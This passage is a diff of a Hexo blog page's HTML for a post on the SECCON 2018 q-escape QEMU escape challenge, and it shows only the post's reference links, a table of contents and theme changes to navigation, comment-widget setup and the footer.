class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/image-20230315163823703.png"
-                      alt="image-20230315163823703"
-                ></p>
+<p><img   src="/images/image-20230315163823703.png"  alt="image-20230315163823703"></p>
 <hr>
 <p>参考链接:<br>  <a class="link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/224199#h3-11" >https://www.anquanke.com/post/id/224199#h3-11<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   target="_blank" rel="noopener" href="https://devcraft.io/2018/11/22/q-escape-seccon-2018.html" >https://devcraft.io/2018/11/22/q-escape-seccon-2018.html<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   target="_blank" rel="noopener" href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga.c#L2004<i class="fas fa-external-link-alt"></i></a><br>  <a class="link"   target="_blank" rel="noopener" href="https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h" >https://github.com/qemu/qemu/blob/master/hw/display/cirrus_vga_internal.h<i class="fas fa-external-link-alt"></i></a><br>题目链接:<br>  <a class="link"   target="_blank" rel="noopener" href="https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip" >https://github.com/196082/196082/blob/main/qemu_escape/q-escape.zip<i class="fas fa-external-link-alt"></i></a></p>
 
-        </div>
+                    
+                </div>
 
-        
-
-        
-            <div class="article-nav">
                 
-                    <div class="article-prev">
-                        <a class="prev"
-                           rel="prev"
-                           href="/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"
-                        >
-                            <span class="left arrow-icon flex-center">
-                              <i class="fas fa-chevron-left"></i>
-                            </span>
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">FUZZ(1):初探AFL</span>
-                                <span class="post-nav-item">上一篇</span>
-                            </span>
-                        </a>
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/mmio/">mmio</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/pmio/">pmio</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/vga/">vga</a>
+                                    </li>
+                                
+                            </ul>
+                        
                     </div>
-                
-                
-                    <div class="article-next">
-                        <a class="next"
-                           rel="next"
-                           href="/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"
-                        >
-                            <span class="title flex-center">
-                                <span class="post-nav-title-item">qemu逃逸入门</span>
-                                <span class="post-nav-item">下一篇</span>
-                            </span>
-                            <span class="right arrow-icon flex-center">
-                              <i class="fas fa-chevron-right"></i>
-                            </span>
-                        </a>
+                    <div>
+                        
                     </div>
-                
-            </div>
-        
+                </div>
 
-        
-            <div class="comment-container">
-                <div class="comments-container">
-    <div id="comment-anchor"></div>
-    <div class="comment-area-title">
-        <i class="fas fa-comments">&nbsp;评论</i>
+                
+                    
+
+<div class="reward-author-container border-box flex-center">
+    <div class="reward-btn border-box flex-center tooltip tooltip-img"
+            data-tooltip-img-url="/images/reward.jpg"
+            data-tooltip-img-trigger="click"
+            data-tooltip-img-style="top: -6px;"
+    >
+        <i class="fa-solid fa-mug-hot"></i>&nbsp;激励牛马，加速创作！
     </div>
-    
+</div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"
+                                   title="FUZZ(1):初探AFL"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">FUZZ(1):初探AFL</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/02/05/qemu%E9%80%83%E9%80%B8%E5%85%A5%E9%97%A8/"
+                                   title="qemu逃逸入门"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">qemu逃逸入门</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
 
         
             
+
     <div class="valine-container">
-        <script 
-                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"></script>
         <div id="vcomments"></div>
-        <script >
-            function loadValine() {
-                new Valine({
-                    el: '#vcomments',
-                    appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
-                    appKey: 'C672AAYGXMkHxztf8ntdLShs',
-                    meta: ['nick', 'mail', 'link'],
-                    avatar: 'wavatar',
-                    enableQQ: true,
-                    placeholder: '😜若有问题请各位大师傅留言评论',
-                    lang: 'zh-CN'.toLowerCase()
-                });
-
-                function getAuthor(language) {
-                    switch (language) {
-                        case 'en':
-                            return 'Author';
-                        case 'zh-CN':
-                            return '博主';
-                        default:
-                            return 'Master';
-                    }
-                }
-
-                // Add "Author" identify
-                const getValineDomTimer = setInterval(() => {
-                    const vcards = document.querySelectorAll('#vcomments .vcards .vcard');
-                    if (vcards.length > 0) {
-                        let author = '196082';
-
-                        if (author) {
-                            for (let vcard of vcards) {
-                                const vnick_dom = vcard.querySelector('.vhead .vnick');
-                                const vnick = vnick_dom.innerHTML;
-                                if (vnick === author) {
-                                    vnick_dom.innerHTML = `${vnick} <span class="author">${getAuthor(KEEP.hexo_config.language)}</span>`
-                                }
-                            }
-                        }
-                        clearInterval(getValineDomTimer);
-                    } else {
-                        clearInterval(getValineDomTimer);
-                    }
-                }, 2000);
+        <script 
+                src="//cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js"
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        ></script>
+        <script 
+                async
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          window.KeepCommentPlugin.initValine = () => {
+            const config = {
+              el: '#vcomments',
+              appId: 'OcvtJuJHDrSFIyDGdp3rLMtA-gzGzoHsz',
+              appKey: 'C672AAYGXMkHxztf8ntdLShs',
+              meta: ['nick', 'mail', 'link'],
+              avatar: 'wavatar',
+              enableQQ: true,
+              placeholder: '😜若有问题请各位大师傅留言评论',
+              lang: 'zh-CN'.toLowerCase()
             }
 
-            if ('false') {
-                const loadValineTimeout = setTimeout(() => {
-                    loadValine();
-                    clearTimeout(loadValineTimeout);
-                }, 1000);
+            if ('') {
+              config.serverURLs = ''
+            }
+
+            if (window?.Valine) {
+              new Valine(config)
+              window.KeepCommentPlugin.hideLoading()
             } else {
-                window.addEventListener('DOMContentLoaded', loadValine);
+              setTimeout(() => {
+                window.KeepCommentPlugin.initValine()
+              }, 1000)
             }
+          }
+
+          if ('false' === 'true') {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initValine()
+            }, 1200)
+          } else {
+            window.addEventListener('DOMContentLoaded', window.KeepCommentPlugin.initValine)
+          }
         </script>
     </div>
 
 
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
 
         
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E5%88%86%E6%9E%90"><span class="nav-text">设备分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">综上，可得exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2024
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">196082</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
     
-</div>
-
-            </div>
         
-    </div>
-</div>
-
-
-                
-            </div>
-
-        </div>
-
-        <div class="page-main-content-bottom">
-            <footer class="footer">
-    <div class="info-container">
-        <div class="copyright-info info-item">
-            &copy;
+        <div class="deploy-info info-item">
             
-              <span>2021</span>&nbsp;-&nbsp;
+            本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/brands/github.png"></span> 提供部署服务
             
-            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">196082</a>
         </div>
-        
-            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-            <div class="website-count info-item">
-                
-                    <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
-                    </span>
-                
-                
-                    <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
-                    </span>
-                
-            </div>
-        
-        <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">335.6k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+                <span class="count-item border-box pv">
+                    <span class="item-type border-box">访问量</span>
+                    <span class="item-value border-box pv" id="busuanzi_value_site_pv"></span>
+                </span>
+            
         </div>
-        
-    </div>
+    
+
+    
 </footer>
 
         </div>
     </div>
 
+    <!-- post tools -->
     
-        <div class="post-tools">
-            <div class="post-tools-container">
-    <ul class="tools-list">
-        <!-- TOC aside toggle -->
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
         
-            <li class="tools-item page-aside-toggle">
-                <i class="fas fa-outdent"></i>
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
             </li>
         
 
-        <!-- go comment -->
+        <!-- PC go comment -->
         
-            <li class="go-comment">
+            <li class="tools-item flex-center go-to-comments">
                 <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
             </li>
         
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
     </ul>
 </div>
 
         </div>
     
 
-    <div class="right-bottom-side-tools">
-        <div class="side-tools-container">
-    <ul class="side-tools-list">
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
         <li class="tools-item tool-font-adjust-plus flex-center">
             <i class="fas fa-search-plus"></i>
         </li>
@@ -540,13 +679,12 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <li class="tools-item tool-expand-width flex-center">
-            <i class="fas fa-arrows-alt-h"></i>
-        </li>
-
-        <li class="tools-item tool-dark-light-toggle flex-center">
-            <i class="fas fa-moon"></i>
-        </li>
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
 
         <!-- rss -->
         
@@ -560,42 +698,45 @@
             </li>
         
 
-        
-            <li class="tools-item tool-scroll-to-top flex-center">
-                <i class="fas fa-arrow-up"></i>
-            </li>
-        
-
+        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
     </ul>
 
-    <ul class="exposed-tools-list">
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+            <li class="tools-item go-to-comments-tablet flex-center">
+                <i class="fas fa-comment"></i>
+            </li>
+        
+
         <li class="tools-item tool-toggle-show flex-center">
             <i class="fas fa-cog fa-spin"></i>
         </li>
-        
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
     </ul>
 </div>
 
     </div>
 
-    
-        <aside class="page-aside">
-            <div class="post-toc-wrap">
-    <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E5%88%86%E6%9E%90"><span class="nav-text">设备分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">综上，可得exp</span></a></li></ol></li></ol>
-    </div>
-</div>
-        </aside>
-    
-
-    <div class="image-viewer-container">
-    <img src="">
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
 
 
+    <!-- local search -->
     
         <div class="search-pop-overlay">
     <div class="popup search-popup">
@@ -613,7 +754,7 @@
                        class="search-input"
                 >
             </div>
-            <span class="popup-btn-close">
+            <span class="close-popup-btn">
                 <i class="fas fa-times"></i>
             </span>
         </div>
@@ -627,29 +768,76 @@
 
     
 
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AE%BE%E5%A4%87%E5%88%86%E6%9E%90"><span class="nav-text">设备分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%BC%E4%B8%8A%EF%BC%8C%E5%8F%AF%E5%BE%97exp"><span class="nav-text">综上，可得exp</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
 </main>
 
 
 
-<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/dark-light-toggle.js"></script>
 
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/local-search.js"></script>
+<!-- common js -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/utils.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/header-shrink.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/back2top.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/toggle-theme.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/code-block.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/main.min.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/libs/anime.min.js"></script>
+
+<!-- local search -->
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/local-search.min.js"></script>
 
 
+<!-- lazyload -->
 
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/code-copy.js"></script>
-
-
-
-    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/lazyload.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/lazyload.min.js"></script>
 
 
-<div class="post-scripts">
+<div class="">
+    <!-- home page -->
     
-        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.3/source/js/toc.js"></script>
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/post-helper.min.js"></script>
+
+        <!-- toc -->
+        
+            <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.2/js/post/toc.min.js"></script>
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
     
 </div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
 
 
 
